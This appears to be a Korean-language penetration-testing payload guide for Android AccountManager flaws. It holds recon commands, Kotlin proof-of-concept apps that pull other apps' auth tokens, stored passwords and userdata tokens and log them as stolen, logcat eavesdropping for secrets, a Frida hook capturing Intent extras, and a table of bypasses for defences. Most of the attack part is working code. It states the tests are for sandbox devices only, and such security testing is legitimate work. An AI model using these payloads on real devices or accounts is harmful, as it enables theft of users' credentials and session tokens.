### 정찰 페이로드

#### [필수] 동적 테스트 전 환경 점검

```bash
which adb || echo "MISSING: adb"
adb devices | awk 'NR>1 && $2=="device"{c++} END{print c+0" device(s)"}'
adb shell pm list packages | grep -F '<com.target.app>' || echo "MISSING: target package"
adb shell 'su -c "ps -A | grep frida-server"' 2>/dev/null || echo "MISSING: frida-server (Tier 3 필요)"
```

**[필수] sandbox 한정**: prod 사용자 단말/계정 절대 사용 금지.

#### 계정 및 인증자 열거

```bash
# 등록된 계정 목록 확인 (GET_ACCOUNTS 권한 필요 — Android 8.0+는 같은 서명 앱만)
adb shell dumpsys account

# AccountAuthenticator 등록 목록
adb shell dumpsys account | grep -A5 "Authenticators"

# 대상 앱의 AccountAuthenticator service 확인
apktool d -f -s target.apk -o /tmp/target_apk
grep -n "AbstractAccountAuthenticator\|AccountAuthenticator\|getAuthToken\|peekAuthToken" \
  /tmp/target_apk/smali/**/*.smali 2>/dev/null || true

# 소스코드 환경
grep -rn "AbstractAccountAuthenticator\|getAuthToken\|peekAuthToken\|getPassword\|KEY_AUTHTOKEN" \
  --include="*.kt" --include="*.java" .
```

#### 정적 분석 — AccountAuthenticator 구현체 점검

```bash
# Binder.getCallingUid() / caller 검증 부재 확인
grep -n "getCallingUid\|getCallerUid\|KEY_ANDROID_PACKAGE_NAME\|checkCallingPermission" \
  --include="*.kt" --include="*.java" -r .

# getAuthToken 구현체에서 토큰을 Bundle에 넣는 경우
grep -n "KEY_AUTHTOKEN\|putString.*TOKEN\|putString.*token" \
  --include="*.kt" --include="*.java" -r .

# 토큰 Logcat 출력
grep -n 'Log\.\(d\|i\|e\|w\|v\).*[Tt]oken\|Log\.\(d\|i\|e\|w\|v\).*[Pp]assword' \
  --include="*.kt" --include="*.java" -r .
```

---

### 기본 페이로드

#### `AUTH_TOKEN_EXPOSURE` — PoC 앱으로 타 앱 토큰 탈취

```kotlin
// PoC 앱 코드 (GET_ACCOUNTS 권한 선언 후 설치)
val am = getSystemService(ACCOUNT_SERVICE) as AccountManager
val accounts = am.getAccountsByType("<target.account.type>")

for (account in accounts) {
    am.getAuthToken(account, "<authTokenType>", null, false, { future ->
        try {
            val bundle = future.result
            val token = bundle.getString(AccountManager.KEY_AUTHTOKEN)
            Log.e("POC", "탈취된 토큰: $token")
        } catch (e: Exception) {
            Log.e("POC", "실패: ${e.message}")
        }
    }, null)
}
```

```bash
# Android 5.x ~ 7.x: GET_ACCOUNTS가 dangerous → 런타임 권한 필요
# Android 8.0+: 동일 서명 앱만 타 앱 계정 열거 가능
# → 공격 전제: 동일 서명 또는 targetSdkVersion < 26인 구형 앱
adb install poc-get-token.apk
adb shell am start -n com.poc.app/.MainActivity
adb logcat | grep "탈취된 토큰"
```

#### `PASSWORD_EXPOSURE` — getPassword() 직접 탈취

```kotlin
val am = getSystemService(ACCOUNT_SERVICE) as AccountManager
val accounts = am.getAccountsByType("<target.account.type>")
for (account in accounts) {
    val pw = am.getPassword(account)   // AccountManager에 저장된 password
    Log.e("POC", "password: $pw")
}
```

#### `INSECURE_ACCOUNT_STORE` — getUserData로 민감 필드 읽기

```kotlin
val am = getSystemService(ACCOUNT_SERVICE) as AccountManager
val accounts = am.getAccountsByType("<target.account.type>")
for (account in accounts) {
    // addAccountExplicitly(account, pw, userdata) 호출 시 userdata 번들에 저장한 값
    val secret = am.getUserData(account, "access_token")
    val refresh = am.getUserData(account, "refresh_token")
    Log.e("POC", "access=$secret refresh=$refresh")
}
```

#### `TOKEN_IN_LOG` — Logcat 도청

```bash
# 로그인 흐름 실행 후 토큰 출력 여부 확인
adb logcat -s "AuthToken:*" "*:E" | grep -iE "token|password|secret|key"

# 전체 Logcat (root 환경)
adb logcat | grep -iE "authtoken|access_token|refresh_token|password"
```

#### `TOKEN_IN_INTENT` — Intent 스니핑

```bash
# implicit Intent로 토큰 전달 시 — 다른 앱이 같은 action 등록하면 수신 가능
# Frida로 sendBroadcast / startActivity의 Intent extras 캡처
```

```javascript
Java.perform(() => {
  const Context = Java.use("android.content.Context");
  Context.sendBroadcast.overload("android.content.Intent").implementation = function(intent) {
    const extras = intent.getExtras();
    if (extras) {
      const keys = extras.keySet().toArray();
      keys.forEach(k => {
        const v = extras.get(k);
        console.log("[INTENT EXTRA]", k, "=", v);
      });
    }
    return this.sendBroadcast(intent);
  };
});
```

---

### 우회 페이로드

| 방어 | 우회 |
|---|---|
| `getAccountsByType()` 결과 없음 (Android 8+) | 동일 서명 앱 빌드 또는 root 환경 `dumpsys account`로 직접 열거 |
| getAuthToken() 호출 시 Authenticator Activity 표시 | 이미 캐시된 토큰은 Activity 없이 즉시 반환됨 (`peekAuthToken` 동등) |
| caller 패키지명 검증 (`KEY_ANDROID_PACKAGE_NAME`) | 패키지명 스푸핑은 불가 — but options 번들에 포함 안 될 경우 null 처리 누락 확인 |
| 서명 권한으로 보호 | 동일 서명 앱(기업 내부 다른 앱 포함)이 취약한 경우 여전히 유효 |

---

### 참고사항

- **Android 버전별 공격 조건 차이**: Android 6.0 미만은 GET_ACCOUNTS가 normal 권한 → 모든 앱 접근 가능. 6.0~7.x는 dangerous 권한 요청 필요. 8.0(API 26)+는 동일 서명 앱만 타 앱 계정 열거 가능 — 구형 targetSdkVersion 앱은 예외
- **AbstractAccountAuthenticator.getAuthToken()는 서비스 호출**: Binder IPC로 호출 → `Binder.getCallingUid()`로 caller UID 검증이 유일한 신뢰 경계
- **peekAuthToken() vs getAuthToken()**: peekAuthToken은 캐시된 토큰을 즉시 반환 (UI 없음) — 특히 탈취에 취약
- **KEY_ANDROID_PACKAGE_NAME 검증 한계**: options 번들에서 꺼내는 값이므로 caller가 조작 가능 — UID 검증 없이 패키지명만 믿으면 우회 가능
- **userdata는 GET_ACCOUNTS 권한 앱이 읽기 가능** — 토큰·비밀번호를 userdata에 저장하는 패턴은 설계 결함
- `addAccountExplicitly(account, password, userdata)` — password 파라미터도 accountManager.getPassword()로 읽기 가능
- Logcat은 Android 4.1 이후 앱이 자신의 로그만 읽을 수 있지만, root/ADB 환경에서는 전체 읽기 가능
- 인증자 서비스가 `android:exported="false"`라도 AccountManager 시스템 프레임워크가 바인딩 — exported 설정과 무관하게 노출
